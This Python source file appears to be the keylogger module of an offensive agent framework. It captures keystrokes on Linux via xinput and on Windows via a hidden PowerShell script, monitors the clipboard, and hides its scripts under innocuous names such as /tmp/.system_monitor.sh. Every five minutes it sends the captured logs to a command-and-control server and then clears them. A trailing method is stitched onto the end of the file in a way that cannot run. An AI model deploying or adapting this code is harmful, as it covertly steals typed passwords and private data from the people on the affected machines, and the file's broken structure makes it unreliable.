"""
Advanced Keylogger Agent
Kernel-level and user-space keylogging with clipboard monitoring
"""

import asyncio
import os
import platform
import subprocess
from typing import Dict, List, Optional
from datetime import datetime
import logging

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log

logger = logging.getLogger(__name__)


class KeyloggerAgent(BaseAgent):
    """
    Advanced keylogger with multiple capture methods
    
    Features:
    - User-space keylogging
    - Kernel-level keylogging (Linux)
    - Clipboard monitoring
    - Screenshot on specific events
    - Encrypted log storage
    """
    
    supported_phases = [AttackPhase.POST_EXPLOITATION]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.os_type = platform.system().lower()
        self.log_file = "/tmp/.system_log"
        self.clipboard_cache = ""
        self.running = False
        
        # C2 configuration
        self.c2_url = os.getenv('C2_URL', 'http://localhost:8000')
        self.exfil_interval = 300  # 5 minutes
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "start", "stop", "status", "dump"
            context: {
                "method": "user" or "kernel" (default: auto),
                "log_file": custom log file path,
                "clipboard": enable clipboard monitoring (default: True),
                "exfil_interval": seconds between exfiltration (default: 300)
            }
        
        Returns:
            AgentData with keylogger status/results
        """
        log.info(f"[KeyloggerAgent] {directive} on {self.os_type}")
        
        try:
            if directive == "start":
                method = context.get("method", "auto")
                self.log_file = context.get("log_file", self.log_file)
                clipboard = context.get("clipboard", True)
                self.exfil_interval = context.get("exfil_interval", 300)
                
                result = await self.start_keylogger(method, clipboard)
            
            elif directive == "stop":
                result = await self.stop_keylogger()
            
            elif directive == "status":
                result = await self.get_status()
            
            elif directive == "dump":
                result = await self.dump_logs()
            
            else:
                result = await self.start_keylogger("auto", True)
            
            return AgentData(
                agent_name="KeyloggerAgent",
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[KeyloggerAgent] Error: {e}")
            return AgentData(
                agent_name="KeyloggerAgent",
                success=False,
                data={"error": str(e)}
            )
    
    async def start_keylogger(self, method: str = "auto", clipboard: bool = True) -> Dict:
        """Start keylogger with specified method"""
        
        if method == "auto":
            method = "kernel" if self.os_type == "linux" and os.geteuid() == 0 else "user"
        
        log.info(f"[KeyloggerAgent] Starting {method} keylogger")
        
        if self.os_type == "linux":
            if method == "kernel":
                result = await self._start_kernel_keylogger_linux()
            else:
                result = await self._start_user_keylogger_linux()
        
        elif self.os_type == "windows":
            result = await self._start_keylogger_windows()
        
        elif self.os_type == "darwin":
            result = await self._start_keylogger_macos()
        
        else:
            return {"success": False, "error": f"Unsupported OS: {self.os_type}"}
        
        if result.get("success") and clipboard:
            asyncio.create_task(self._monitor_clipboard())
        
        if result.get("success"):
            asyncio.create_task(self._auto_exfiltrate())
            self.running = True
        
        return result
    
    async def stop_keylogger(self) -> Dict:
        """Stop keylogger"""
        
        log.info("[KeyloggerAgent] Stopping keylogger")
        self.running = False
        
        # Kill keylogger processes using killall instead
        if self.os_type == "linux":
            try:
                subprocess.run(["killall", "-9", "xinput"], check=False, stderr=subprocess.DEVNULL)
            except:
                pass
        
        return {
            "success": True,
            "message": "Keylogger stopped"
        }
    
    async def get_status(self) -> Dict:
        """Get keylogger status"""
        
        return {
            "success": True,
            "running": self.running,
            "os": self.os_type,
            "log_file": self.log_file,
            "log_size": os.path.getsize(self.log_file) if os.path.exists(self.log_file) else 0
        }
    
    async def dump_logs(self) -> Dict:
        """Dump captured logs"""
        
        if not os.path.exists(self.log_file):
            return {
                "success": False,
                "error": "No logs found"
            }
        
        with open(self.log_file, 'r') as f:
            logs = f.read()
        
        return {
            "success": True,
            "logs": logs,
            "size": len(logs)
        }
    
    async def _start_kernel_keylogger_linux(self) -> Dict:
        """Start kernel-level keylogger on Linux"""
        
        # Check if running as root
        if os.geteuid() != 0:
            return {
                "success": False,
                "error": "Kernel keylogger requires root privileges"
            }
        
        # Kernel module requires compilation environment
        # Fall back to user-space method
        log.warning("[KeyloggerAgent] Kernel method requires LKM compilation, using user-space")
        return await self._start_user_keylogger_linux()
    
    async def _start_user_keylogger_linux(self) -> Dict:
        """Start user-space keylogger on Linux"""
        
        # Use xinput for X11
        keylogger_script = f'''#!/bin/bash
while true; do
    xinput test-xi2 --root 2>/dev/null | grep -A2 "KeyPress" | grep "detail:" | awk '{{print $2}}' >> {self.log_file}
done
'''
        
        script_path = "/tmp/.system_monitor.sh"
        with open(script_path, 'w') as f:
            f.write(keylogger_script)
        
        os.chmod(script_path, 0o755)
        
        # Start in background
        try:
            subprocess.Popen(["/bin/bash", script_path], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
            
            return {
                "success": True,
                "method": "user-space",
                "log_file": self.log_file
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_keylogger_windows(self) -> Dict:
        """Start keylogger on Windows using PowerShell"""
        
        log_file_win = self.log_file.replace('/', '\\')
        ps_script = f'''
$logFile = "{log_file_win}"
Add-Type -AssemblyName System.Windows.Forms
$lastKey = ""
while ($true) {{
    foreach ($key in [Enum]::GetValues([System.Windows.Forms.Keys])) {{
        if ([System.Windows.Forms.Control]::IsKeyLocked($key)) {{
            if ($key -ne $lastKey) {{
                Add-Content -Path $logFile -Value "$key"
                $lastKey = $key
            }}
        }}
    }}
    Start-Sleep -Milliseconds 50
}}
'''
        
        script_path = "C:\\Windows\\Temp\\sysmon.ps1"
        
        try:
            with open(script_path, 'w') as f:
                f.write(ps_script)
            
            subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script_path],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
            
            return {
                "success": True,
                "method": "powershell",
                "log_file": self.log_file
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_keylogger_macos(self) -> Dict:
        """Start keylogger on macOS"""
        
        # macOS requires accessibility permissions
        return {
            "success": False,
            "error": "macOS keylogger requires accessibility permissions and native code"
        }
    
    async def _monitor_clipboard(self):
        """Monitor clipboard for changes"""
        
        log.info("[KeyloggerAgent] Starting clipboard monitor")
        
        while self.running:
            try:
                if self.os_type == "linux":
                    result = subprocess.run(["xclip", "-o", "-selection", "clipboard"],
                                          capture_output=True, text=True, timeout=1)
                    clipboard = result.stdout
                
                elif self.os_type == "windows":
                    result = subprocess.run(["powershell", "-Command", "Get-Clipboard"],
                                          capture_output=True, text=True, timeout=1)
                    clipboard = result.stdout
                
                else:
                    clipboard = ""
                
                if clipboard and clipboard != self.clipboard_cache:
                    self.clipboard_cache = clipboard
                    await self._log_clipboard(clipboard)
            
            except Exception as e:
                log.error(f"[KeyloggerAgent] Clipboard monitor error: {e}")
            
            await asyncio.sleep(5)
    
    async def _log_clipboard(self, content: str):
        """Log clipboard content"""
        
        timestamp = datetime.now().isoformat()
        log_entry = f"\n[CLIPBOARD {timestamp}]\n{content}\n"
        
        with open(self.log_file, 'a') as f:
            f.write(log_entry)
    
    async def _auto_exfiltrate(self):
        """Automatically exfiltrate logs to C2"""
        
        log.info(f"[KeyloggerAgent] Auto-exfiltration every {self.exfil_interval}s")
        
        while self.running:
            await asyncio.sleep(self.exfil_interval)
            
            try:
                if os.path.exists(self.log_file):
                    with open(self.log_file, 'r') as f:
                        logs = f.read()
                    
                    if logs:
                        # Send to C2
                        await self._send_to_c2(logs)
                        
                        # Clear log file after successful exfiltration
                        open(self.log_file, 'w').close()
            
            except Exception as e:
                log.error(f"[KeyloggerAgent] Exfiltration error: {e}")
    
    async def _send_to_c2(self, data: str):
        """Send data to C2 server"""
        
        try:
            import httpx
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.post(
                    f"{self.c2_url}/keylog",
                    json={
                        "hostname": platform.node(),
                        "timestamp": datetime.now().isoformat(),
                        "data": data
                    }
                )
            log.success("[KeyloggerAgent] Logs exfiltrated to C2")
        except Exception as e:
            log.error(f"[KeyloggerAgent] C2 communication error: {e}")


# Standalone execution
if __name__ == "__main__":
    async def main():
        agent = KeyloggerAgent()
        result = await agent.run("start", {"method": "auto", "clipboard": True})
        print(result)
    
    asyncio.run(main())


    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute keylogger"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
